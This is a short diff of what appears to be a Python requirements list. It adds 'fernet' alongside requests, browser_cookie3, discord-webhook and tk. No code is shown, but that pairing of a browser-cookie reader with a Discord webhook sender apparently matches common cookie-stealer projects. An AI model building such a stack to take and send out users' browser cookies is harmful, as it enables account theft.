@@ -10,3 +10,4 @@ requests
 browser_cookie3
 discord-webhook
 tk
+fernet
